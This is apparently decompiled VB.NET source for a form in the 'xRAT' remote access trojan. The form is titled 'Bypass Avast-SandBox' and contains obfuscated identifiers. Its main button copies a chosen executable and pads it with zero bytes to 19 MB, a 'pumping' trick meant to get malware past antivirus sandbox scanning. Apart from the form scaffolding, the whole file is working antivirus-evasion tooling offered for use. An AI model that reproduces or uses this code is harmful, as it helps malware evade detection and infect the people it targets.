Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class Avast
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim dialog As New SaveFileDialog With { _
                .Filter = "Exe Files|*.exe" _
            }
            dialog.ShowDialog
            Dim num As Double = Conversions.ToDouble("19")
            File.Copy(Me.TextBox1.Text, dialog.FileName)
            num = (num * 1048576)
            Dim stream As FileStream = File.OpenWrite(dialog.FileName)
            Dim i As Long = stream.Seek(0, SeekOrigin.End)
            Do While (i < num)
                stream.WriteByte(0)
                i = (i + 1)
            Loop
            stream.Close
            Interaction.MsgBox("Successfully Pumped!", MsgBoxStyle.OkOnly, Nothing)
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim dialog As New OpenFileDialog With { _
                .Filter = "Exe Files|*.exe" _
            }
            dialog.ShowDialog
            Me.TextBox1.Text = dialog.FileName
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(Avast))
            Me.PictureBox1 = New PictureBox
            Me.Button1 = New Button
            Me.TextBox1 = New TextBox
            Me.Button2 = New Button
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Me.PictureBox1.Image = Class5.smethod_43
            Dim point As New Point(&H15, 12)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            Dim size As New Size(50, 50)
            Me.PictureBox1.Size = size
            Me.PictureBox1.TabIndex = 0
            Me.PictureBox1.TabStop = False
            point = New Point(12, &H44)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H10C, 50)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 1
            Me.Button1.Text = ":: Bypass Avast-SandBox ::"
            Me.Button1.UseVisualStyleBackColor = True
            point = New Point(&H51, 12)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            size = New Size(&HC7, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 3
            point = New Point(&H51, &H27)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&HC7, &H17)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 4
            Me.Button2.Text = "..."
            Me.Button2.UseVisualStyleBackColor = True
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H129, &H81)
            Me.ClientSize = size
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.PictureBox1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "Avast"
            Me.Text = " Bypass Avast-SandBox"
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = value
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        Private icontainer_0 As IContainer
    End Class
End Namespace

